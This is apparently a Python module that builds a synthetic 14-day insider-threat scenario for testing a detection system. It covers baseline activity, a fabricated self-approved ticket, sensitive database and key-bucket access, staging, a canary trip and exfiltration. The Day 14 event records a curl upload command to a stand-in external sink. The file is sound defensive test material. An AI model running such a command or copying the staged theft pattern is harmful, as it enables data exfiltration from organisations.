"""Project TRIDENT — Master 14-Day Demo Dataset.

Assembles the master 14-day enterprise dataset driving the six hackathon demo beats:
- Days 1–4:  Benign Baseline (normal development activity)
- Day 5:     Beat 2: Benign Anomaly Suppressed (legitimate Jira project assignment)
- Days 6–8:  Background routine activity
- Day 9:     Beat 2: Silent Drift Begins (unanchored repo & S3 queries, CUSUM rises)
- Day 10:    Beat 3: Fabricated Context Detection (ticket 4 mins prior, self-approved, CAS=0.21, unsuppressed)
- Day 11:    Intermediate reconnaissance & database queries
- Day 12:    Beat 4: Sensitive Staging & Canary Prediction (staging to memory mount)
- Day 13:    Beat 4: Simulated Canary Trip (decoy triggered -> state CONFIRMED)
- Day 14:    Beat 5: Escalation, Causal Dossier & Shamir 2-of-3 Unmasking Ready
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from typing import List, Optional
import uuid

from backend.common.schemas import (
    ActorContext,
    AnchorCandidate,
    BusinessContext,
    CanonicalEvent,
    EventType,
    IdentityType,
    NetworkContext,
    ResourceContext,
)
from backend.drift.schemas import TrajectoryState
from backend.risk.schemas import RiskTier
from backend.scenarios.schemas import (
    ScenarioDataset,
    ScenarioMetadata,
    ScenarioType,
)


class MasterDemoDatasetBuilder:
    """Constructs the canonical 14-day TRIDENT demo scenario."""

    def __init__(self, base_timestamp: Optional[datetime] = None):
        self.base_timestamp = base_timestamp or datetime(2026, 9, 1, 8, 0, 0, tzinfo=timezone.utc)
        self.actor_token = "Subject-Theta-482"

    def _event(
        self,
        event_id: str,
        timestamp: datetime,
        action: str,
        resource_id: str,
        resource_type: str,
        sensitivity: float,
        event_type: EventType = EventType.DATA_ACCESS,
        ticket_ids: Optional[List[str]] = None,
        is_canary: bool = False,
        source_system: str = "aws_cloudtrail",
    ) -> CanonicalEvent:
        return CanonicalEvent(
            event_id=event_id,
            timestamp=timestamp,
            event_type=event_type,
            action=action,
            actor=ActorContext(
                actor_token=self.actor_token,
                identity_type=IdentityType.HUMAN,
                role="Engineering Lead",
                department="Engineering",
                peer_group="Engineering-Backend",
            ),
            resource=ResourceContext(
                resource_id=resource_id,
                resource_type=resource_type,
                sensitivity=sensitivity,
                is_canary=is_canary,
            ),
            network=NetworkContext(
                source_ip="10.14.20.105",
                destination_endpoint=resource_id,
                is_vpn=True,
            ),
            business_context=BusinessContext(
                ticket_ids=ticket_ids or [],
            ),
            raw_payload_hash=f"demo-hash-{uuid.uuid4().hex[:8]}",
            source_system=source_system,
        )

    def build(self) -> ScenarioDataset:
        historical_resources = [
            "repo:corp/frontend-app",
            "repo:corp/backend-api",
            "repo:corp/shared-components",
            "repo:corp/docs",
        ]
        events: List[CanonicalEvent] = []
        anchors: List[AnchorCandidate] = []

        # =====================================================================
        # Days 1–4: Baseline Activity (Normal business hours)
        # =====================================================================
        for day in range(1, 5):
            day_t = self.base_timestamp + timedelta(days=day)
            for i, res in enumerate(historical_resources):
                events.append(
                    self._event(
                        event_id=f"EVT-DEMO-D{day}-{i}",
                        timestamp=day_t.replace(hour=9 + (i * 2), minute=15),
                        action="git:pull" if i % 2 == 0 else "git:push",
                        resource_id=res,
                        resource_type="Repository",
                        sensitivity=0.25,
                        event_type=EventType.CODE_REPOSITORY,
                        source_system="github_audit",
                    )
                )

        # =====================================================================
        # Day 5 (Beat 2): Legitimate New Project Assignment (Benign Anomaly)
        # =====================================================================
        day5_t = self.base_timestamp + timedelta(days=5)
        legit_ticket_id = "JIRA-PROJ-841"
        anchors.append(
            AnchorCandidate(
                anchor_id=legit_ticket_id,
                anchor_type="JiraTicket",
                title="Project Titan - Analytics Service Setup",
                description="Assigned as backend lead for Project Titan analytics migration.",
                created_at=day5_t.replace(hour=8, minute=30),
                requester_id="mgr-vp-eng",
                approver_id="mgr-vp-eng",
                status="IN_PROGRESS",
                is_emergency=False,
                target_resources=["repo:corp/project-titan-analytics", "db:analytics-staging"],
                downstream_artifacts=["PR-774", "COMMIT-TITAN-01"],
            )
        )
        # Day 5 events on new resources under legitimate ticket
        events.append(
            self._event(
                event_id="EVT-DEMO-D5-TITAN-REPO",
                timestamp=day5_t.replace(hour=10, minute=0),
                action="git:clone",
                resource_id="repo:corp/project-titan-analytics",
                resource_type="Repository",
                sensitivity=0.40,
                event_type=EventType.CODE_REPOSITORY,
                ticket_ids=[legit_ticket_id],
                source_system="github_audit",
            )
        )
        events.append(
            self._event(
                event_id="EVT-DEMO-D5-TITAN-DB",
                timestamp=day5_t.replace(hour=11, minute=30),
                action="db:connect",
                resource_id="db:analytics-staging",
                resource_type="Database",
                sensitivity=0.45,
                event_type=EventType.DATABASE_QUERY,
                ticket_ids=[legit_ticket_id],
                source_system="aws_cloudtrail",
            )
        )

        # =====================================================================
        # Days 6–8: Routine Background Activity
        # =====================================================================
        for day in range(6, 9):
            day_t = self.base_timestamp + timedelta(days=day)
            for i, res in enumerate(historical_resources[:2]):
                events.append(
                    self._event(
                        event_id=f"EVT-DEMO-D{day}-{i}",
                        timestamp=day_t.replace(hour=10 + i, minute=30),
                        action="git:commit",
                        resource_id=res,
                        resource_type="Repository",
                        sensitivity=0.25,
                        event_type=EventType.CODE_REPOSITORY,
                        source_system="github_audit",
                    )
                )

        # =====================================================================
        # Day 9 (Beat 2): Silent Drift Begins (Off-hours, unassigned repos/S3)
        # =====================================================================
        day9_t = self.base_timestamp + timedelta(days=9)
        events.append(
            self._event(
                event_id="EVT-DEMO-D9-DRIFT-S3",
                timestamp=day9_t.replace(hour=19, minute=15),
                action="s3:ListObjectsV2",
                resource_id="arn:aws:s3:::internal-financial-forecasts",
                resource_type="Bucket",
                sensitivity=0.80,
                event_type=EventType.DATA_ACCESS,
            )
        )
        events.append(
            self._event(
                event_id="EVT-DEMO-D9-DRIFT-REPO",
                timestamp=day9_t.replace(hour=20, minute=45),
                action="git:clone",
                resource_id="repo:corp/payment-vault-core",
                resource_type="Repository",
                sensitivity=0.85,
                event_type=EventType.CODE_REPOSITORY,
                source_system="github_audit",
            )
        )

        # =====================================================================
        # Day 10 (Beat 3): Fabricated Jira Ticket (Self-approved, 4 mins prior)
        # =====================================================================
        day10_t = self.base_timestamp + timedelta(days=10)
        exploit_time = day10_t.replace(hour=22, minute=8)
        fab_ticket_time = exploit_time - timedelta(minutes=4)  # 22:04
        fab_ticket_id = "JIRA-FAB-841"

        anchors.append(
            AnchorCandidate(
                anchor_id=fab_ticket_id,
                anchor_type="JiraTicket",
                title="Urgent DB Maintenance on EU Payroll",
                description="Fixing index fragmentation on payroll records.",
                created_at=fab_ticket_time,
                requester_id=self.actor_token,
                approver_id=self.actor_token,  # Self-approved!
                status="OPEN",
                is_emergency=False,
                target_resources=["db:eu-payroll-records"],
                downstream_artifacts=[],  # Ghost ticket: zero downstream commits!
            )
        )
        events.append(
            self._event(
                event_id="EVT-DEMO-D10-PAYROLL-EXPLOIT",
                timestamp=exploit_time,
                action="SELECT * FROM eu_employees_salary_2026",
                resource_id="db:eu-payroll-records",
                resource_type="Database",
                sensitivity=0.95,
                event_type=EventType.DATABASE_QUERY,
                ticket_ids=[fab_ticket_id],
            )
        )

        # =====================================================================
        # Day 11: Intermediate Sensitive Reconnaissance
        # =====================================================================
        day11_t = self.base_timestamp + timedelta(days=11)
        events.append(
            self._event(
                event_id="EVT-DEMO-D11-SECRETS",
                timestamp=day11_t.replace(hour=21, minute=30),
                action="s3:GetObject",
                resource_id="arn:aws:s3:::cryptographic-keys-backup",
                resource_type="Bucket",
                sensitivity=0.95,
                event_type=EventType.DATA_ACCESS,
            )
        )

        # =====================================================================
        # Day 12 (Beat 4): Sensitive Staging to Temporary Memory Mount
        # =====================================================================
        day12_t = self.base_timestamp + timedelta(days=12)
        events.append(
            self._event(
                event_id="EVT-DEMO-D12-STAGE-TMP",
                timestamp=day12_t.replace(hour=22, minute=40),
                action="file:write (gzip tarball)",
                resource_id="mount:tmpfs-staging-exfil",
                resource_type="Bucket",
                sensitivity=0.90,
                event_type=EventType.DATA_STAGING,
            )
        )

        # =====================================================================
        # Day 13 (Beat 4): Simulated Canary Trip
        # =====================================================================
        day13_t = self.base_timestamp + timedelta(days=13)
        canary_resource = "arn:aws:s3:::canary-decoy-payroll-backup"
        events.append(
            self._event(
                event_id="EVT-DEMO-D13-CANARY-TRIP",
                timestamp=day13_t.replace(hour=23, minute=15),
                action="s3:GetObject",
                resource_id=canary_resource,
                resource_type="Bucket",
                sensitivity=1.0,
                event_type=EventType.DATA_EXFILTRATION,
                is_canary=True,
            )
        )

        # =====================================================================
        # Day 14 (Beat 5): High-Severity Exfiltration & Incident Escalation
        # =====================================================================
        day14_t = self.base_timestamp + timedelta(days=14)
        events.append(
            self._event(
                event_id="EVT-DEMO-D14-EXFILTRATION",
                timestamp=day14_t.replace(hour=1, minute=20),
                action="curl --upload-file https://external-exfil-sink.net/dump.tar.gz",
                resource_id="endpoint:external-exfil-sink",
                resource_type="Bucket",
                sensitivity=1.0,
                event_type=EventType.DATA_EXFILTRATION,
            )
        )

        meta = ScenarioMetadata(
            scenario_id="MASTER_DEMO",
            scenario_type=ScenarioType.MASTER_14_DAY_DEMO,
            name="Project TRIDENT 14-Day Hackathon Master Demo",
            description="End-to-end multi-beat scenario demonstrating benign suppression (Day 5), silent drift (Day 9), fabricated context detection (Day 10), staging (Day 12), simulated canary trip (Day 13), and Tier 4 escalation (Day 14).",
            primary_actor_token=self.actor_token,
            duration_days=14,
            expected_trajectory_state=TrajectoryState.CRITICAL,
            expected_risk_tier=RiskTier.TIER_4_CRITICAL,
            key_signals=[
                "Day 5: High CAS Attenuates Anomaly",
                "Day 9: Unanchored Cumulative Drift Rises",
                "Day 10: Low CAS (0.21) Fails Suppression",
                "Day 13: Simulated Canary Confirmation",
                "Day 14: Tier 4 Escalation & Shamir Unmasking",
            ],
            claim_label="Measured Today",
        )

        return ScenarioDataset(
            metadata=meta,
            events=events,
            anchors=anchors,
            historical_resources=historical_resources,
        )
